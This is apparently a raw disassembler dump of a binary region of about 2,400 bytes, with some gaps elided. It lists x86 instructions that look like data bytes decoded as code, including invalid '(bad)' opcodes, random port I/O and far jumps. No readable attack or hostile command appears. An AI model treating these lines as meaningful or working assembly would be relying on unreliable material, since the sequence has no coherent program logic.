  42c4c2:	xchg   ebp,eax
  42c4c3:	mov    al,0xf5
  42c4c5:	xchg   DWORD PTR [edi-0x54],ebx
  42c4c8:	mov    bh,0x72
  42c4ca:	jecxz  0x42c537
  42c4cc:	into   
  42c4cd:	xlat   BYTE PTR ds:[ebx]
  42c4ce:	xor    eax,DWORD PTR [ecx]
  42c4d0:	stc    
  42c4d1:	jbe    0x42c513
  42c4d3:	sahf   
  42c4d4:	xchg   esp,eax
  42c4d5:	lahf   
  42c4d6:	inc    esi
  42c4d7:	push   ds
  42c4d8:	xchg   BYTE PTR [ecx],dl
  42c4da:	xor    BYTE PTR [esi],bl
  42c4dc:	and    ecx,DWORD PTR [edx+ebp*8]
  42c4df:	popf   
  42c4e0:	push   esi
  42c4e1:	test   DWORD PTR [ebx],0x3d34a0fd
  42c4e7:	fstp   DWORD PTR [eax+ebp*2+0x6e73c95e]
  42c4ee:	repz retf 
  42c4f0:	daa    
  42c4f1:	push   eax
  42c4f2:	rol    DWORD PTR [edx+0x4f301cda],cl
  42c4f8:	mov    cl,0x66
  42c4fa:	les    ebx,FWORD PTR [ebx-0x24]
  42c4fd:	in     eax,0x69
  42c4ff:	jmp    0x42c4d0
  42c501:	cdq    
  42c502:	dec    esi
  42c503:	scas   al,BYTE PTR es:[edi]
  42c504:	sbb    al,BYTE PTR [esi+0x61c21f1a]
  42c50a:	push   edx
  42c50b:	in     eax,dx
  42c50c:	sti    
  42c50d:	inc    esp
  42c50e:	aad    0x3d
  42c510:	hlt    
  42c511:	int3   
  42c512:	adc    edx,esp
  42c514:	or     eax,0x3e79c0c0
  42c519:	outs   dx,DWORD PTR ds:[esi]
  42c51a:	pop    eax
  42c51b:	push   ds
  42c51c:	arpl   WORD PTR [ebp-0x62],dx
  42c51f:	mov    WORD PTR [edx-0x46d0e1dd],gs
  42c525:	imul   edx,DWORD PTR [edi],0xfffffff2
  42c528:	sbb    DWORD PTR [eax+0x13],eax
  42c52b:	mov    ah,0xdc
  42c52d:	outs   dx,BYTE PTR ds:[esi]
  42c52e:	cmp    al,0x8a
  42c530:	mov    BYTE PTR [edx],bl
  42c532:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c533:	mov    dl,BYTE PTR [ecx]
  42c535:	xchg   ebp,eax
  42c536:	leave  
  42c537:	push   edx
  42c538:	inc    ecx
  42c539:	cmp    BYTE PTR [edx],0xf1
  42c53c:	inc    eax
  42c53d:	les    esp,FWORD PTR [edx]
  42c53f:	mov    eax,0x6b1e2094
  42c544:	xor    dh,BYTE PTR [ebx]
  42c546:	rcl    edx,cl
  42c548:	fstp   QWORD PTR [ecx]
  42c54a:	inc    ebx
  42c54b:	sub    al,0x53
  42c54d:	stos   DWORD PTR es:[edi],eax
  42c54e:	mov    edx,0xd345b131
  42c553:	out    dx,al
  42c554:	cmp    dh,BYTE PTR [ecx-0x5373f6c5]
  42c55a:	sar    BYTE PTR [ebx],cl
  42c55c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c55d:	or     eax,0x671ded0f
  42c562:	xchg   ebx,eax
  42c563:	inc    ebx
  42c564:	pop    esi
  42c565:	pop    ds
  42c566:	mov    bh,0x46
  42c568:	les    esp,FWORD PTR [edi-0x52836dc2]
  42c56e:	mov    edx,edx
  42c570:	in     eax,0x88
  42c572:	cmp    ecx,esp
  42c574:	out    dx,al
  42c575:	jae    0x42c578
  42c577:	out    dx,al
  42c578:	test   DWORD PTR [esi-0x6e391881],esi
  42c57e:	stc    
  42c57f:	inc    esp
  42c580:	push   cs
  42c581:	or     DWORD PTR [edi],ebp
  42c583:	dec    edx
  42c584:	ins    DWORD PTR es:[edi],dx
  42c585:	ins    BYTE PTR es:[edi],dx
  42c586:	retf   0x894c
  42c589:	xor    eax,0x5e102a49
  42c58e:	pop    es
  42c58f:	push   0xffffffa7
  42c591:	cli    
  42c592:	cmp    BYTE PTR [edx+0x2a],al
  42c595:	mov    WORD PTR [edx+edx*8-0xe33246b],ds
  42c59c:	out    dx,al
  42c59d:	call   0x4f1e:0x7d68e89a
  42c5a4:	cmp    al,0x59
  42c5a6:	push   ebp
  42c5a7:	mov    al,0xa2
  42c5a9:	fs in  al,dx
  42c5ab:	gs jne 0x42c536
  42c5ae:	fwait
  42c5af:	inc    ebp
  42c5b0:	inc    ebx
  42c5b1:	ss push ebx
  42c5b3:	xor    ebx,DWORD PTR [edx]
	...
  42c615:	add    BYTE PTR [ebp+0x48],bl
  42c618:	jle    0x42c5a8
  42c61a:	jg     0x42c5da
  42c61c:	std    
  42c61d:	fisttp DWORD PTR [edi-0x31]
  42c620:	inc    eax
  42c621:	push   edi
  42c622:	inc    esi
  42c623:	adc    esp,ecx
  42c625:	adc    al,0x10
  42c627:	fild   DWORD PTR [ecx]
  42c629:	add    BYTE PTR [edi],al
  42c62b:	add    DWORD PTR [eax],eax
  42c62d:	add    BYTE PTR [edi-0xd2730e0],dl
  42c633:	loopne 0x42c5ec
  42c635:	and    ebp,0x76
  42c638:	das    
  42c639:	(bad)  
  42c63a:	unpckhps xmm2,xmm1
  42c63d:	retf   0x4704
  42c640:	xchg   edx,eax
  42c641:	sub    esi,edx
  42c643:	(bad)  
  42c644:	jmp    0xf7e5:0x67b7ad8e
  42c64b:	or     BYTE PTR [ecx-0x1cc54bff],dl
  42c651:	sbb    al,0xfb
  42c653:	lea    edx,[eax-0x17cb1f2f]
  42c659:	add    BYTE PTR [eax+0x48],0xe5
  42c65d:	iret   
  42c65e:	div    DWORD PTR [ebx+0x19afe3b5]
  42c664:	rol    DWORD PTR [edx],1
  42c666:	mov    ebx,0x9b199671
  42c66b:	push   cs
  42c66c:	repnz inc esi
  42c66e:	push   esp
  42c66f:	ds hlt 
  42c671:	jo     0x42c6a6
  42c673:	mov    DWORD PTR [ebp-0x24],edi
  42c676:	sti    
  42c677:	mov    al,0x7e
  42c679:	or     BYTE PTR [esi-0x7d3fe8dd],ah
  42c67f:	cmp    eax,0x83a68304
  42c684:	pop    ebx
  42c685:	inc    ebx
  42c686:	outs   dx,DWORD PTR ds:[esi]
  42c687:	xchg   esi,eax
  42c688:	ds (bad) 
  42c68a:	pop    edi
  42c68b:	retf   
  42c68c:	xchg   BYTE PTR [edx+0x512c2bf2],ch
  42c692:	div    BYTE PTR [ebx+edx*1-0xe001a07]
  42c699:	sbb    BYTE PTR [esi],dl
  42c69b:	inc    esp
  42c69c:	jl     0x42c6aa
  42c69e:	xchg   ebx,eax
  42c69f:	push   ecx
  42c6a0:	js     0x42c666
  42c6a2:	jl     0x42c6e1
  42c6a4:	(bad)  
  42c6a5:	or     ebx,DWORD PTR [ecx]
  42c6a7:	xor    DWORD PTR [esi-0x53],ebp
  42c6aa:	int3   
  42c6ab:	fisub  DWORD PTR fs:[eax-0x2893fd4d]
  42c6b2:	inc    edi
  42c6b3:	xchg   ebx,eax
  42c6b4:	mov    ss,esi
  42c6b6:	outs   dx,BYTE PTR ds:[esi]
  42c6b7:	int    0xa2
  42c6b9:	sbb    DWORD PTR ds:0x7deee20c,ebp
  42c6bf:	sar    ah,cl
  42c6c1:	sbb    BYTE PTR [ecx+edx*1+0x28],ah
  42c6c5:	retf   0xb320
  42c6c8:	mov    ch,0xff
  42c6ca:	push   0xffffff94
  42c6cc:	mov    esi,0xfbe8b668
  42c6d1:	retf   0x7583
  42c6d4:	and    cl,bh
  42c6d6:	ja     0x42c72d
  42c6d8:	sub    eax,0xe1b94074
  42c6dd:	loop   0x42c6af
  42c6df:	bswap  esi
  42c6e1:	jecxz  0x42c6fc
  42c6e3:	loopne 0x42c66f
  42c6e5:	es retf 0x84e5
  42c6e9:	xchg   edx,eax
  42c6ea:	stos   DWORD PTR es:[edi],eax
  42c6eb:	cmp    DWORD PTR [edx-0x7b],ebx
  42c6ee:	arpl   bx,si
  42c6f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c6f1:	fdiv   QWORD PTR ds:[eax]
  42c6f4:	idiv   esp
  42c6f6:	fwait
  42c6f7:	push   ss
  42c6f8:	in     al,dx
  42c6f9:	repz xor dl,ch
  42c6fc:	(bad)  
  42c6fd:	stos   DWORD PTR es:[edi],eax
  42c6fe:	add    bl,BYTE PTR ds:0xc36c0bff
  42c704:	sub    BYTE PTR [ebx+eax*2-0x2172f6cd],ah
  42c70b:	xchg   ecx,eax
  42c70c:	dec    esi
  42c70d:	test   eax,0x35d9c385
  42c712:	mov    ds:0xe937966d,eax
  42c717:	cmp    ebp,ecx
  42c719:	mov    dl,0x71
  42c71b:	popa   
  42c71c:	ret    0xf007
  42c71f:	mov    ds:0xcc72026c,al
  42c724:	int    0xf4
  42c726:	and    bl,BYTE PTR [eax-0x7e030e5c]
  42c72c:	adc    esi,edx
  42c72e:	inc    edi
  42c72f:	xchg   BYTE PTR ds:0xa091e346,ah
	...
  42c795:	add    BYTE PTR [eax],bh
  42c797:	mov    DWORD PTR [edx-0x6b],ebp
  42c79a:	sti    
  42c79b:	idiv   edi
  42c79d:	lods   eax,DWORD PTR ds:[esi]
  42c79e:	push   ss
  42c79f:	mov    al,ds:0x24f33f90
  42c7a4:	xor    DWORD PTR [ebp+0x1dc17],edx
  42c7aa:	pop    es
  42c7ab:	add    DWORD PTR [eax],eax
  42c7ad:	add    al,ah
  42c7af:	enter  0x9930,0xe0
  42c7b3:	shr    BYTE PTR [eax],0x89
  42c7b6:	es pusha 
  42c7b8:	shl    DWORD PTR [esi+eiz*2+0x218dd788],cl
  42c7bf:	lds    esi,FWORD PTR [eax]
  42c7c1:	mov    ebp,0xa35ac5d4
  42c7c6:	bnd jp 0x42c792
  42c7c9:	dec    edi
  42c7ca:	xor    DWORD PTR [ecx],ebx
  42c7cc:	or     DWORD PTR [esi-0x125e5fc5],0xdd6ef977
  42c7d6:	jmp    0x7a56de31
  42c7db:	xchg   esi,eax
  42c7dc:	ds sub al,0xe3
  42c7df:	sbb    DWORD PTR [ebx],ecx
  42c7e1:	add    DWORD PTR [edx+0x17b75ae7],edx
  42c7e7:	aad    0xd8
  42c7e9:	cmp    ebx,esp
  42c7eb:	inc    esi
  42c7ec:	retf   0x6018
  42c7ef:	jmp    0xca07:0x27dd03e8
  42c7f6:	inc    eax
  42c7f7:	ins    DWORD PTR es:[edi],dx
  42c7f8:	popf   
  42c7f9:	add    BYTE PTR [ebx],0xb2
  42c7fc:	mov    esp,0xb365c446
  42c801:	sbb    ebx,esi
  42c803:	mov    ch,BYTE PTR [eax-0x6f43f3b9]
  42c809:	sahf   
  42c80a:	lock add edx,DWORD PTR [ebx+0x79]
  42c80e:	push   0xffffff88
  42c810:	(bad)  
  42c811:	in     al,dx
  42c812:	scas   al,BYTE PTR es:[edi]
  42c813:	inc    esi
  42c814:	sub    ebx,DWORD PTR [esi+0x61131be1]
  42c81a:	and    bh,BYTE PTR [esi]
  42c81c:	imul   ecx,DWORD PTR [eax+0x4],0xffffffab
  42c820:	mov    eax,0x7a964ce1
  42c825:	mov    edx,0x4c7bbfd3
  42c82a:	ds sahf 
  42c82c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c82d:	or     ah,dh
  42c82f:	ins    DWORD PTR es:[edi],dx
  42c830:	fild   DWORD PTR [edx+0x58]
  42c833:	jg     0x42c830
  42c835:	mov    ds:0xb002afbb,al
  42c83a:	or     ah,BYTE PTR [ecx]
  42c83c:	sub    BYTE PTR [ebx+0x3c],ch
  42c83f:	sub    edx,DWORD PTR [edi+0x5c]
  42c842:	mov    cs,WORD PTR [ecx+ebp*2]
  42c845:	dec    ebp
  42c846:	mov    ds:0xea1a626c,eax
  42c84b:	data16 fwait
  42c84d:	pop    esi
  42c84e:	dec    esi
  42c84f:	jecxz  0x42c8af
  42c851:	xchg   BYTE PTR ds:0x163a8d63,al
  42c857:	mov    edx,0xde1367e1
  42c85c:	mov    fs,WORD PTR [esp+eiz*4-0x7a]
  42c860:	sbb    eax,0x6560d8e
  42c865:	repz add cl,dh
  42c868:	xor    esi,DWORD PTR [ebx+edx*4-0x34]
  42c86c:	jg     0x42c83e
  42c86e:	mov    WORD PTR [ebx+0x13],?
  42c871:	and    al,0x55
  42c873:	call   0x3c6:0xef455c90
  42c87a:	pusha  
  42c87b:	icebp  
  42c87c:	cmp    edi,ebx
  42c87e:	sub    eax,0xdbb9bbe2
  42c883:	mov    al,0xd4
  42c885:	cmp    BYTE PTR [eax+0x6a],dl
  42c888:	mov    esp,0x990e64e0
  42c88d:	dec    ebp
  42c88e:	cs cmp DWORD PTR es:[ecx-0x70],esi
  42c893:	pop    esi
  42c894:	lods   eax,DWORD PTR ds:[esi]
  42c895:	pop    edx
  42c896:	or     bh,BYTE PTR [edi]
  42c898:	sbb    dh,BYTE PTR [eax-0x59924f5a]
  42c89e:	sub    ebp,0x3d
  42c8a1:	retf   
  42c8a2:	ss lahf 
  42c8a4:	push   esi
  42c8a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c8a6:	icebp  
  42c8a7:	int    0x78
  42c8a9:	cmp    bl,BYTE PTR [edi+0x10]
  42c8ac:	adc    eax,0x785d3fa3
  42c8b1:	lods   al,BYTE PTR ds:[esi]
  42c8b2:	loopne 0x42c890
  42c8b4:	mov    DWORD PTR [eax],eax
	...
  42c916:	adc    BYTE PTR [ebx],bl
  42c918:	leave  
  42c919:	jmp    0xfb73c4e9
  42c91e:	addr16 mov ds:0xa954,al
  42c922:	shl    BYTE PTR [eax-0x22e18bde],cl
  42c928:	add    DWORD PTR [eax],eax
  42c92a:	pop    es
  42c92b:	add    DWORD PTR [eax],eax
  42c92d:	add    BYTE PTR [edi+0x2bb8375d],bl
  42c933:	push   edi
  42c934:	mov    ecx,0x970bc2e6
  42c939:	mov    bh,0x8
  42c93b:	std    
  42c93c:	dec    edi
  42c93d:	adc    al,0x1f
  42c93f:	dec    ecx
  42c940:	out    dx,eax
  42c941:	shl    ch,cl
  42c943:	mov    ah,0xb9
  42c945:	jge    0x42c941
  42c947:	xor    DWORD PTR [edi-0x35828c78],edx
  42c94d:	(bad)  
  42c94e:	fsubr  st(1),st
  42c950:	mov    edx,0x8d9d0ac5
  42c955:	adc    ebx,DWORD PTR [ebx+0x2a66db79]
  42c95b:	loopne 0x42c923
  42c95d:	mov    esp,0x7fdec27
  42c962:	jnp    0x42c914
  42c964:	icebp  
  42c965:	jbe    0x42c9a5
  42c967:	out    0x5a,eax
  42c969:	jg     0x42c92c
  42c96b:	push   ebp
  42c96c:	mov    al,ds:0xc185f68c
  42c971:	sub    ah,dh
  42c973:	clc    
  42c974:	(bad)  
  42c975:	stos   DWORD PTR es:[edi],eax
  42c976:	adc    eax,esi
  42c978:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c979:	stos   DWORD PTR es:[edi],eax
  42c97a:	out    dx,al
  42c97b:	jp     0x42c951
  42c97d:	sbb    edi,DWORD PTR [esi-0xc9f814a]
  42c983:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c984:	stos   BYTE PTR es:[edi],al
  42c985:	adc    esp,eax
  42c987:	not    DWORD PTR [eax-0x346d6d9f]
  42c98d:	jl     0x42c964
  42c98f:	mov    al,0x8a
  42c991:	aam    0xae
  42c993:	sub    esp,DWORD PTR [ecx+0x70]
  42c996:	mov    BYTE PTR [esi+0x4],bl
  42c999:	mov    BYTE PTR [esi],cl
  42c99b:	jecxz  0x42c98a
  42c99d:	or     eax,0x801be538
  42c9a2:	fadd   DWORD PTR [ebx]
  42c9a4:	jp     0x42c94f
  42c9a6:	div    eax
  42c9a8:	js     0x1e95306b
  42c9ae:	jne    0x42c9cb
  42c9b0:	adc    BYTE PTR [edx-0x6ccf1a8c],dh
  42c9b6:	imul   ebx,ecx,0x348212db
  42c9bc:	cs inc edi
  42c9be:	jg     0x42c981
  42c9c0:	jb     0x42c9ad
  42c9c2:	add    BYTE PTR [ecx],dl
  42c9c4:	xor    BYTE PTR [edx+0x58],cl
  42c9c7:	dec    edi
  42c9c8:	into   
  42c9c9:	ds cwde 
  42c9cb:	jmp    0x42c96c
  42c9cd:	lods   eax,DWORD PTR ds:[esi]
  42c9ce:	inc    ecx
  42c9cf:	stos   DWORD PTR es:[edi],eax
  42c9d0:	lea    eax,[ebx-0x7d]
  42c9d3:	out    0xc3,eax
  42c9d5:	or     BYTE PTR [eax-0x2c],bh
  42c9d8:	shr    DWORD PTR [ecx-0x5e],0xc1
  42c9dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c9dd:	pop    edx
  42c9de:	cmp    al,0xa3
  42c9e0:	jmp    0x2c7:0x4fcbb4ab
  42c9e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c9e8:	or     BYTE PTR [eax-0x52],bh
  42c9eb:	ss jg  0x42ca1d
  42c9ee:	push   DWORD PTR [edx]
  42c9f0:	mov    BYTE PTR [eax-0x343b1ff2],ah
  42c9f6:	pop    edi
  42c9f7:	rcr    DWORD PTR [ecx+0x45e8fdd7],0xd2
  42c9fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c9ff:	mov    ecx,0xbc27a221
  42ca04:	sbb    al,0xc4
  42ca06:	mov    BYTE PTR [eax+0x5e4cd903],ah
  42ca0c:	mov    al,0x66
  42ca0e:	jbe    0x42ca54
  42ca10:	(bad)  
  42ca11:	outs   dx,BYTE PTR ds:[esi]
  42ca12:	inc    ecx
  42ca13:	popa   
  42ca14:	aam    0x2d
  42ca16:	inc    esp
  42ca17:	outs   dx,DWORD PTR ds:[esi]
  42ca18:	sub    DWORD PTR [ecx-0x5d],ebp
  42ca1b:	and    eax,0x6f2df05b
  42ca20:	push   es
  42ca21:	xor    eax,0x90276fc5
  42ca26:	push   0x47470c60
  42ca2b:	hlt    
  42ca2c:	mov    eax,ds:0xdcd6d4d6
  42ca31:	jb     0x42ca67
  42ca33:	mov    al,0xe
	...
  42ca95:	add    BYTE PTR [edi-0x2be7726],ah
  42ca9b:	push   ebx
  42ca9c:	out    dx,eax
  42ca9d:	(bad)  
  42ca9e:	jb     0x42cab7
  42caa0:	shr    DWORD PTR ds:0xb880b051,1
  42caa6:	and    eax,0x70001de
  42caab:	add    DWORD PTR [eax],eax
  42caad:	add    BYTE PTR [esi+esi*8],dl
  42cab0:	(bad)  
  42cab1:	cmp    DWORD PTR [ebx+0x665487c6],ebp
  42cab7:	jns    0x42cb1b
  42cab9:	rcr    DWORD PTR [edi],cl
  42cabb:	out    dx,eax
  42cabc:	mov    ebx,0x74c6f9a3
  42cac1:	(bad)  
  42cac2:	cmp    ecx,DWORD PTR [edi]
  42cac4:	jne    0x42caea
  42cac6:	dec    esi
  42cac7:	xor    cl,BYTE PTR [ebp+0x3af43b94]
  42cacd:	mov    edi,0x9a7cc9fe
  42cad2:	sub    al,0x25
  42cad4:	in     al,0x7f
  42cad6:	push   es
  42cad7:	int3   
  42cad8:	outs   dx,DWORD PTR ds:[esi]
  42cad9:	jl     0x42caa2
  42cadb:	jmp    0x444b9f61
  42cae0:	arpl   WORD PTR [esi+eax*8+0x69],sp
  42cae4:	inc    ebx
  42cae5:	out    dx,eax
  42cae6:	repnz sbb al,0x16
  42cae9:	jno    0x42cafe
  42caeb:	xor    BYTE PTR [edx],cl
  42caed:	xchg   edx,eax
  42caee:	mov    BYTE PTR [edi+0x15],dl
  42caf1:	xchg   esi,eax
  42caf2:	jne    0x42cb51
  42caf4:	dec    ebp
  42caf5:	xor    al,0x2f
  42caf7:	in     eax,dx
  42caf8:	mov    WORD PTR [eax+esi*8-0x78],ss
  42cafc:	cmp    eax,0x420eff3b
  42cb01:	(bad)  
  42cb02:	xchg   esi,eax
  42cb03:	push   edx
  42cb04:	test   al,0xd2
  42cb06:	repz sbb esi,edx
  42cb09:	leave  
  42cb0a:	push   ebx
  42cb0b:	jle    0x42cb4c
  42cb0d:	pop    ecx
  42cb0e:	shl    DWORD PTR [eax-0x6f299cbb],1
  42cb14:	call   0x52c4aac3
  42cb19:	add    al,0x17
  42cb1b:	mov    ah,BYTE PTR [ebx-0x56]
  42cb1e:	outs   dx,BYTE PTR ds:[esi]
  42cb1f:	add    DWORD PTR [edx+0x4022397],eax
  42cb25:	call   FWORD PTR [edx]
  42cb27:	pop    es
  42cb28:	sub    al,BYTE PTR [esi-0x35b5719]
  42cb2e:	mov    eax,cs:0xa83deafe
  42cb34:	sub    eax,DWORD PTR [ebp+0x30]
  42cb37:	push   gs
  42cb39:	push   ebx
  42cb3a:	icebp  
  42cb3b:	fst    DWORD PTR [ebx]
  42cb3d:	push   ebx
  42cb3e:	loop   0x42cb38
  42cb40:	out    0xd7,eax
  42cb42:	jmp    0x42cb52
  42cb44:	add    eax,0x50890bc3
  42cb49:	pop    ss
  42cb4a:	xchg   ecx,eax
  42cb4b:	aad    0x74
  42cb4d:	adc    eax,0x905dc923
  42cb52:	test   eax,0x3c6c3b45
  42cb57:	fcom   DWORD PTR [eax-0x35]
  42cb5a:	mov    eax,ds:0xa6f32fd8
  42cb5f:	fst    QWORD PTR [edx+0x5edb5f01]
  42cb65:	mov    ds,WORD PTR [esi]
  42cb67:	ins    BYTE PTR es:[edi],dx
  42cb68:	mov    ebx,0xc63756ef
  42cb6d:	ja     0x42cb9c
  42cb6f:	leave  
  42cb70:	inc    ebx
  42cb71:	out    0x86,eax
  42cb73:	in     al,dx
  42cb74:	dec    ebx
  42cb75:	jmp    0x2eff:0x6402914b
  42cb7c:	and    bl,dl
  42cb7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cb7f:	test   DWORD PTR [esi+0x2972273a],0x27876a21
  42cb89:	dec    eax
  42cb8a:	jb     0x42cb7a
  42cb8c:	shl    DWORD PTR [edx+ebx*2],1
  42cb8f:	mov    cl,0x59
  42cb91:	push   esi
  42cb92:	int3   
  42cb93:	push   0xffffff9e
  42cb95:	or     eax,0x193236a8
  42cb9a:	int3   
  42cb9b:	ins    DWORD PTR es:[edi],dx
  42cb9c:	ja     0x42cbe0
  42cb9e:	dec    edi
  42cb9f:	pop    eax
  42cba0:	aaa    
  42cba1:	pop    es
  42cba2:	imul   esp,DWORD PTR [eax-0x4b9f4ce7],0x1f
  42cba9:	mov    DWORD PTR ds:0xf0ddfc63,eax
  42cbaf:	pop    ebx
  42cbb0:	mov    ax,0xf643
  42cbb4:	inc    ecx
	...
  42cc15:	add    BYTE PTR [edi+0x2],bh
  42cc18:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42cc1c:	call   FWORD PTR [ebx]
  42cc1e:	iret   
  42cc1f:	mov    dl,0xde
  42cc21:	stc    
  42cc22:	out    dx,al
  42cc23:	mov    WORD PTR [eax+0x7],?
  42cc26:	sub    al,0xdf
  42cc28:	add    DWORD PTR [eax],eax
  42cc2a:	pop    es
  42cc2b:	add    DWORD PTR [eax],eax
  42cc2d:	add    BYTE PTR [ebx-0x50b9963b],ch
  42cc33:	es fwait
  42cc35:	pop    eax
  42cc36:	dec    ecx
  42cc37:	daa    
  42cc38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cc39:	mov    dl,0xe1
  42cc3b:	mov    dh,0x5a
  42cc3d:	add    dh,bh
  42cc3f:	mov    WORD PTR [edi],ds
  42cc41:	rol    dl,1
  42cc43:	and    BYTE PTR [edx],0x87
  42cc46:	repz sub ah,BYTE PTR [eax]
  42cc49:	mov    WORD PTR cs:[edi],ds
  42cc4c:	jecxz  0x42cbdd
  42cc4e:	fcom   DWORD PTR [eax]
  42cc50:	int    0x3c
  42cc52:	xor    al,0x55
  42cc54:	repnz das 
  42cc56:	pop    ecx
  42cc57:	psubsw mm4,QWORD PTR [eax-0x1f86783b]
  42cc5e:	aas    
  42cc5f:	(bad)  
  42cc60:	in     eax,dx
  42cc61:	inc    ebp
  42cc62:	push   ebx
  42cc63:	popf   
  42cc64:	arpl   WORD PTR gs:[ecx-0x4e],bx
  42cc68:	jl     0x42cc7f
  42cc6a:	push   ebp
  42cc6b:	and    al,0x89
  42cc6d:	mov    ch,bh
  42cc6f:	xchg   BYTE PTR [eax+0x3c5e86b1],dh
  42cc75:	je     0x42cc33
  42cc77:	cmp    al,0x17
  42cc79:	pop    esi
  42cc7a:	pop    ds
  42cc7b:	jno    0x42cc0e
  42cc7d:	stos   BYTE PTR es:[edi],al
  42cc7e:	pop    ecx
  42cc7f:	lea    esp,[ebx+eiz*1]
  42cc82:	scas   al,BYTE PTR es:[edi]
  42cc83:	ja     0x42cc6e
  42cc85:	pop    es
  42cc86:	pop    ecx
  42cc87:	xchg   esi,eax
  42cc88:	test   dh,bl
  42cc8a:	out    0x46,eax
  42cc8c:	adc    eax,0xcef5489d
  42cc91:	or     edx,DWORD PTR [ecx-0x66df2c7]
  42cc97:	aad    0xad
  42cc99:	ins    DWORD PTR es:[edi],dx
  42cc9a:	wbinvd 
  42cc9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cc9d:	stos   DWORD PTR es:[edi],eax
  42cc9e:	inc    edi
  42cc9f:	mov    gs,WORD PTR [edi+0x1022db1]
  42cca5:	mov    bl,0x8d
  42cca7:	aas    
  42cca8:	sub    al,0xe4
  42ccaa:	sub    eax,0xf133d7bd
  42ccaf:	mov    al,ds:0x63ab9f86
  42ccb4:	sar    DWORD PTR [esi-0x26],1
  42ccb7:	sar    DWORD PTR es:0xb5c27623,0x21
  42ccbf:	aad    0xe9
  42ccc1:	sub    al,0x15
  42ccc3:	ins    DWORD PTR es:[edi],dx
  42ccc4:	xor    al,0xfb
  42ccc6:	or     sp,ax
  42ccc9:	lss    esp,FWORD PTR [ecx+edx*4]
  42cccd:	xor    ebp,DWORD PTR [edi]
  42cccf:	loope  0x42ccd9
  42ccd1:	jl     0x42ccdc
  42ccd3:	in     eax,dx
  42ccd4:	imul   eax,DWORD PTR [ecx+0x7379fca4],0xffffffe2
  42ccdb:	inc    ebx
  42ccdc:	test   esp,edi
  42ccde:	jnp    0x42cd34
  42cce0:	adc    al,BYTE PTR [ebp-0x5a]
  42cce3:	xchg   edx,eax
  42cce4:	sub    al,0xec
  42cce6:	or     ebx,DWORD PTR [ebx-0x76]
  42cce9:	and    eax,0xb40421a7
  42ccee:	jbe    0x42ccbc
  42ccf0:	icebp  
  42ccf1:	enter  0x6e0c,0x3f
  42ccf5:	into   
  42ccf6:	mov    di,0xb0dd
  42ccfa:	jge    0x42cd26
  42ccfc:	mov    bh,0xb4
  42ccfe:	jbe    0x42ccb5
  42cd00:	dec    esp
  42cd01:	pop    ss
  42cd02:	mov    edx,0xe2dc6d8f
  42cd07:	push   esp
  42cd08:	push   esp
  42cd09:	imul   edi,DWORD PTR [edx+0x64],0xc3376f90
  42cd10:	mov    BYTE PTR [ebp+0x70],ah
  42cd13:	push   0x64
  42cd15:	popa   
  42cd16:	xchg   BYTE PTR [eax],bl
  42cd18:	mov    dl,0x4d
  42cd1a:	push   ebx
  42cd1b:	mov    ebx,0x608831cd
  42cd20:	jmp    0xa649f504
  42cd25:	pop    eax
  42cd26:	jns    0x42cd06
  42cd28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cd29:	adc    ah,bl
  42cd2b:	sub    ah,BYTE PTR [ecx-0x7a38e10b]
  42cd31:	jle    0x42cd1b
  42cd33:	dec    esp
  42cd34:	bound  eax,QWORD PTR [eax]
	...
  42cd96:	sbb    DWORD PTR [ecx-0x20017802],esp
  42cd9c:	jns    0x42cd5d
  42cd9e:	in     eax,0x80
  42cda0:	(bad)  
  42cda2:	fs inc esp
  42cda4:	mov    ebp,0x1e03307
  42cda9:	add    BYTE PTR [edi],al
  42cdab:	add    DWORD PTR [eax],eax
  42cdad:	add    BYTE PTR [esi-0x12],dh
  42cdb0:	mov    al,0xf3
  42cdb2:	cli    
  42cdb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cdb4:	inc    eax
  42cdb5:	and    BYTE PTR [esi+0x23],cl
  42cdb8:	and    al,BYTE PTR [ebp-0xf505836]
  42cdbe:	xchg   ebp,eax
  42cdbf:	fld    TBYTE PTR [edx-0x6d]
  42cdc2:	ja     0x42cd4e
  42cdc4:	jge    0x42cdae
  42cdc6:	xor    BYTE PTR [edi],0x14
  42cdc9:	pop    esp
  42cdca:	popf   
  42cdcb:	adc    eax,0x8c7c19ec
  42cdd0:	pop    edi
  42cdd1:	pop    ecx
  42cdd2:	cs dec ebp
  42cdd4:	push   esi
  42cdd5:	cmp    al,dl
  42cdd7:	jb     0x42ce0a
  42cdd9:	test   ebp,0x5bf33ead
  42cddf:	es call 0x6e3e:0xc064f7b2
  42cde7:	adc    BYTE PTR [edi],al
  42cde9:	rcr    BYTE PTR [ebp-0x3e7d368a],0xca
  42cdf0:	push   cs
  42cdf1:	pop    ss
  42cdf2:	call   0x6103:0xe1dd0b88
  42cdf9:	sub    edi,DWORD PTR [ecx]
  42cdfb:	dec    edi
  42cdfc:	and    eax,0x57e6bb9b
  42ce01:	ds scas al,BYTE PTR es:[edi]
  42ce03:	lds    edi,FWORD PTR [ecx]
  42ce05:	push   esi
  42ce06:	sbb    al,0x51
  42ce08:	lock or eax,0x6d4d696d
  42ce0e:	jbe    0x42cd9c
  42ce10:	push   edi
  42ce11:	push   cs
  42ce12:	pop    ecx
  42ce13:	xlat   BYTE PTR ds:[ebx]
  42ce14:	xor    eax,0xf90224a1
  42ce19:	adc    bh,BYTE PTR [edx]
  42ce1b:	fcmovbe st,st(1)
  42ce1d:	in     al,0xce
  42ce1f:	mov    bh,0x4
  42ce21:	dec    ebp
  42ce22:	outs   dx,BYTE PTR ds:[esi]
  42ce23:	adc    bh,BYTE PTR [eax-0x73]
  42ce26:	data16 aam 0x5c
